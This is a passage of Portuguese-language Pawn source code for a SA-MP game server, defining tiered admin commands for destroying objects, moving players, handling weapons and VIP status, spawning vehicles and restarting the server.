	new id;
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /destruircaixa [ID da caixa]");
	DestroyObject(Caixa[id][ObjectC]);
	Caixa[id][Existe] = 0;
	Caixa[id][PosX] = 0;
	Caixa[id][PosY] = 0;
	Caixa[id][PosZ] = 0;
	Caixa[id][RX] = 0;
	Caixa[id][RY] = 0;
	Caixa[id][RZ] = 0;
	new file[64];
	format(file, sizeof(file), "Data/Caixas/%d.ini", id);
	if(DOF2_FileExists(file))
	{
		DOF2_RemoveFile(file);
	}
	SendClientMessage(playerid, -1, "{71BD73} Caixa destruida com sucesso!");
	return 1;
}

CMD:destruirparede(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /destruirparede [ID da parede]");
	DestroyDynamicObject(Parede[id][ObjectJ]);
	Parede[id][Existe] = 0;
	Parede[id][PosX] = 0;
	Parede[id][PosY] = 0;
	Parede[id][PosZ] = 0;
	Parede[id][RX] = 0;
	Parede[id][RY] = 0;
	Parede[id][RZ] = 0;
	new file[64];
	format(file, sizeof(file), "Data/Paredes/%d.ini", id);
	if(DOF2_FileExists(file))
	{
		DOF2_RemoveFile(file);
	}
	SendClientMessage(playerid, -1, "{71BD73} Parede destruida com sucesso!");
	return 1;
}
CMD:trazertodos(playerid)
{
	new Float:X, Float:Y, Float:Z, str[75];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");

    foreach(new i : Player)
    {
    	GetPlayerPos(playerid, X, Y, Z), SetPlayerPos(i, X, Y, Z);
    	SetPlayerInterior(i, GetPlayerInterior(playerid)), SetPlayerVirtualWorld(i, GetPlayerVirtualWorld(playerid));
    }

    format(str, sizeof(str), "[STAFF]: O admin %s puxou todos jogadores ate sua posicao.", PegarNome(playerid));
    SendClientMessageToAll(COR_VERMELHO, str);
	return 1;
}
CMD:retirararma(playerid, params[])
{
	new motivo[26], str[128];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
    if(pInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "us[30]", params[0], motivo)) return SendClientMessage(playerid, COR_CINZA, "Use: /retirararma [player] [motivo]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(strlen(motivo) > 24) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: O limite de caracteres do motivo e 24!");

    ResetPlayerWeapons(params[0]);

    format(str, sizeof(str), "[INFO] O admin %s retirou todas suas armas, motivo: %s.", PegarNome(playerid), motivo);
    SendClientMessage(params[0], COR_VERMELHO, str);
    format(str, sizeof(str), "[INFO]: %s teve suas armas retiradas.", PegarNome(params[0]));
    SendClientMessage(playerid, COR_VERMELHO, str);
	return 1;
}

// # Comandos Nivel 4

CMD:promover(playerid, params[])
{
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	new id2;
	new str[128];
	if(sscanf(params, "dd", id, id2)) return SendClientMessage(playerid, -1, "Use: /promover [id do player]");
	pInfo[id][pAdmin] = id2;
	SendClientMessage(playerid, -1, "[ INFO ] Cargo atribuido ao jogador!");
	format(str, sizeof(str), "{37C83F}Voce foi promovido pelo administrador {FFFFFF}%s", pName2(playerid));
	SendClientMessage(id, -1, str);
	return 1;
}
CMD:darvip(playerid, params[])
{
	//if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	new str[128];
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /darvip [id do player]");
	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_VERMELHO, "Jogador offline");
	pInfo[id][pVip] = 1;
	SendClientMessage(playerid, -1, "[ INFO ] Vip atribuido ao jogador!");
	format(str, sizeof(str), "[VIP] {37C83F}Voce recebeu {FFFFFF}30 dias {37C83F}de VIP do administrador {FFFFFF}%s.", pName2(playerid));
	SendClientMessage(id, -1, str);
	return 1;
}
CMD:tirarvip(playerid, params[]){
	//if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	new str[128];
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /tirarvip [id do player]");
	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_VERMELHO, "Jogador offline");
	pInfo[id][pVip] = 0;
	format(str, sizeof str, "Seu VIP foi retirado pelo administrador: %s", pName2(playerid));
	SendClientMessage(id, -1, str);
	return 1;
}
CMD:setararma(playerid, params[])
{
	new weaponid, ammo, str[128];
	//if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "uii", params[0], weaponid, ammo)) return SendClientMessage(playerid, COR_CINZA, "Use: /setararma [player] [weapon] [municao]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");

    GivePlayerWeapon(params[0], weaponid, ammo);

    format(str, sizeof(str), "[INFO]: O admin %s lhe entregou uma %s com %i municoes.", PegarNome(playerid), GunName[weaponid], ammo);
    SendClientMessage(params[0], COR_VERMELHO, str);
    format(str, sizeof(str), "[INFO]: Voce deu a %s uma %s com %i municoes.", PegarNome(params[0]), GunName[weaponid], ammo);
    SendClientMessage(playerid, COR_VERMELHO, str);
	{
	//format(str, sizeof(str), "[AVISO] O admin %s entregou uma %s para o jogador %s.", PegarNome(playerid), GunName[weaponid], PegarNome(params[0]));
	//MensageAdmin(COR_VERMELHO, str);
	}
	return 1;
}
CMD:criaritem(playerid, params[])
{
	new Float:X, Float:Y, Float:Z;
	//if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /criaritem [itemid]");

    GetPlayerPos(playerid, X, Y, Z);
    GetXYInFrontOfPlayer(playerid, X, Y, 1.0);
    CreateDrop(params[0], X, Y, Z);
	return 1;
}
CMD:criarcarro(playerid, params[])
{
    new Float:p[3], idcar, cor1, cor2;
    //new String[128];
    new str[200];
	//if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
    if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params,"ddd",idcar,cor1,cor2)) return SendClientMessage(playerid,COR_VERMELHO,"Use: /criarcarro [modelo/id] [cor1] [cor2]");
    {
		GetPlayerPos(playerid, p[0], p[1], p[2]);
        Carro = CreateVehicle(idcar, p[0], p[1], p[2], 0, cor1, cor2, 0);
        PutPlayerInVehicle(playerid, Carro, 0);
        SendClientMessage(playerid,azul, "[ INFO ] Veiculo criado, ao sair dele automaticamente sera deletado!");
    }
    {
        new vehicleid = GetPlayerVehicleID(playerid);
  		vInfo[vehicleid][vTemMotor] = true;
    	vInfo[vehicleid][vCombustivel] += 100;
    	format(str, sizeof(str), "[AVISO] O admin %s criou um veiculo.", pName2(playerid));
		MensageAdmin(COR_VERMELHO, str);
	}
	return 1;
}
CMD:gmx(playerid, params[])
{
    if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	{
		SetTimer("reiniciando1", 60000, false);
		SendClientMessageToAll(azul, "[STAFF] O servidor sera reiniciado dentro de 1 minuto, deslogue antes!");
		GameTextForAll("~w~O SERVIDOR SERA REINICIADO EM INSTANTES", 5000, 5);
	}
	return 1;
}
CMD:acomer(playerid, params[])
{
    if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	{
    	pInfo[playerid][pSede] = 100;
    	pInfo[playerid][pFome] = 100;
    	SendClientMessage(playerid,azul, "[ INFO ] Fome e sede reposta com sucesso.");
	}
	return 1;
}
CMD:avida(playerid){
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	SetPlayerHealth(playerid, 100);
	return 1;
}
CMD:qrpau(playerid)
{
    if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
 	pInfo[playerid][pMadeira] +=100;
	return 1;
}
CMD:acolete(playerid){
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	SetPlayerArmour(playerid, 100);
	return 1;
}
CMD:acoin(playerid, params[])
{
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	pInfo[playerid][pCoin] +=1000;
	return 1;
}
/*CMD:manuadd(playerid, params[]){
	new arquivo5[60], nick;
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", nick)) return SendClientMessage(playerid, COR_VERMELHO, "Uso: /manuadd [nick do staff]");
	format(arquivo5, sizeof arquivo5, "Manutencao/%s.staff", nick);
	DOF2_CreateFile(arquivo5);
	DOF2_SaveFile();
	return 1;
}
CMD:manurem(playerid, params[]){
	new arquivo5[60], nick;
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", nick)) return SendClientMessage(playerid, COR_VERMELHO, "Uso: /manuadd [nick do staff]");
	format(arquivo5, sizeof arquivo5, "Manutencao/%s.staff", nick);
	DOF2_RemoveFile(arquivo5);
	return 1;
}
CMD:manuon(playerid){
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	for(new i = 0; i < MAX_PLAYERS; i++){
		SetTimerEx("manu", 500, false, "i", playerid);
		SendClientMessage(i, azul, "Voce vai ser kickado em segundos, servidor entrara em manutencao");
	}
	return 1;
}*/
////////////////////FINAL COMANDOS DOS ADMINISTRADORES/////////////////////////